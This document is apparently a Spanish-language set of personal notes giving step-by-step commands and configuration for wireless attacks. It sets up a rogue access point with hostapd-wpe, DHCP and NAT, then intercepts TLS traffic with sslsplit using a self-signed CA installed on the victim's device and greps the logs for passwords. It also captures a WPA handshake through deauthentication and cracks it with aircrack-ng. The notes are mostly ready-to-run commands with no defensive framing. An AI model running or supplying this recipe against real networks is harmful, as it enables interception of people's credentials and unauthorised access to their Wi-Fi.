# Teclado ES permanente

Abrir la aplicación "Session and Startup". Ir a la pestaña "Application Autostart" y al botón "+". 

```
Name: Teclado ES
Description:
Command: setxkbmap es sundeadkeys
Trigger: on login
```

# AP

Comprobar que el dispositivo está enchufado y detectado

```
iwconfig
```

Actualizar la lista de paquetes disponibles y sus versiones

```
sudo apt update
```

Modified hostapd to facilitate AP impersonation attacks

(hostapd modificado para facilitar ataques de impersonificación en puntos de acceso)

```
sudo apt install hostapd-wpe
```

```
cd
mkdir pruebas
cd pruebas
```

```
nano host.conf
```

```
interface=wlan0
driver=nl80211
country_code=ES
hw_mode=g
channel=1
ssid=Core Free

#auth_algs=1
#wpa=2
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=CCMP
#wpa_passphrase=12345678
```

# Redirección de tráfico

```
cd
cd pruebas
```

```
touch ip.sh
chmod 700 ip.sh
nano ip.sh
```

```
#!/bin/bash

iptables-legacy -F
iptables-legacy -t nat -F

iptables-legacy -X
iptables-legacy -t nat -X

iptables-legacy -P INPUT ACCEPT
iptables-legacy -P OUTPUT ACCEPT
iptables-legacy -P FORWARD ACCEPT

echo 1 > /proc/sys/net/ipv4/ip_forward

LAN_IF="eth0"

iptables-legacy -t nat -A POSTROUTING -o $LAN_IF -j MASQUERADE
```

# DHCP

```
sudo apt install isc-dhcp-server
sudo cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.ORIGINAL
sudo nano /etc/dhcp/dhcpd.conf
```

Descomentar la siguiente instruccion

```
#authoritative;
```

Añadir al final del documento

```
subnet 172.16.0.0 netmask 255.255.255.0 {
    range 172.16.0.100 172.16.0.240;
    option broadcast-address 172.16.0.255;
    option routers 172.16.0.1;
    option domain-name "local";
    option domain-name-servers 8.8.8.8, 8.8.4.4;
}
```

```
sudo nano /etc/default/isc-dhcp-server
```

Modificarlo de la siguiente forma

```
INTERFACESV4="wlan0"
# INTERFACESV6=""
```

# Iniciar

Nota: Correr en el mismo orden en caso de reiniciar el sistema

```
sudo ifconfig wlan0 172.16.0.1 netmask 255.255.255.0
sudo systemctl start isc-dhcp-server.service
sudo systemctl status isc-dhcp-server.service
```

```
cd
cd pruebas
```

```
sudo ./ip.sh
sudo iptables-legacy -t nat -nL
```

```
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng check
```

```
sudo hostapd-wpe host.conf
```

# SSL

```
cd
cd pruebas
mkdir sslsplit
cd sslsplit
```

Generar el certificado. Debe ser instalado en el dispositivo de la víctima

```
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
```

Editar el script "ip.sh" que teníamos y añadir debajo lo siguiente

```
iptables-legacy -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables-legacy -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080
```

Volver a lanzar

```
sudo ./ip.sh
sudo iptables-legacy -t nat -nL
```

```
cd
cd pruebas/sslsplit
mkdir logdir
```

## Iniciar SSL

```
mkdir /tmp/sslsplit
cd
cd pruebas/sslsplit
```

```
sudo sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
o
sudo sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt https 0.0.0.0 8443 tcp 0.0.0.0 8080
```

```
cd
cd pruebas/sslsplit
tail -f connections.log
```

```
cd
cd pruebas/sslsplit/logdir
ls -la
grep -r 'pass' ./
```

## Certificado

```
http://luisangel2.es/ca.crt
o
https://github.com/luisesp19/ap/raw/main/ca.zip
```

# Fuerza bruta de una red wifi

Crear un "wordlist" de contraseñas

```
cd
cd Desktop
nano contrasenas.txt
```

```
hola
prueba
perro
gato
core
casa
```

Comprobar que el device ha sido detectado

```
iwconfig
```

```
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng check
```

Poner el dispositivo en modo monitor y comprobar que ha cambiado de nombre a "wlan0mon"

```
sudo airmon-ng start wlan0
iwconfig
```

Escanear las redes públicas para obtener el BSSID del punto de acceso y su canal

```
sudo airodump-ng wlan0mon
```

Volver a correr el comando, esta vez especificando ambos y un nombre para el output (archivos de salida) que nos servirán más adelante

```
cd
cd Desktop
sudo airodump-ng -c [canal] --bssid [bssid] -w objetivo wlan0mon
```

En la parte inferior se muestran los dispositivos conectados al punto de acceso.

En otra pestaña del terminal, vamos a desautenticar alguno de los dispositivos legítimos lanzando "tramas de desautenticación". Usar la columna STATION del elegido y nuevamente el BSSID del punto de acceso

```
sudo aireplay-ng -0 5 -a [bssid] -c [station] wlan0mon
```

La desautenticación del dispositivo es imperceptible y el mismo se reconectará automáticamente de forma inmediata pero habremos conseguido el deseado "4-Way Handshake". Comprobarlo en la otra pestaña del terminal "WPA handshake"

Lanzar la fuerza bruta usando el "wordlist" de contraseñas y el ".cap" de los archivos de salida. Si la contraseña está en el wordlist se mostrará "KEY FOUND"

```
cd
cd Desktop
sudo aircrack-ng -w [contrasenas] [cap]
```

# Links

```
https://blog.heckel.io/2013/08/04/use-sslsplit-to-transparently-sniff-tls-ssl-connections/
```

# Otros

```
https://alpaca-attack.com/

https://protegermipc.net/2020/05/27/descifrar-trafico-ssl-con-wireshark/
```
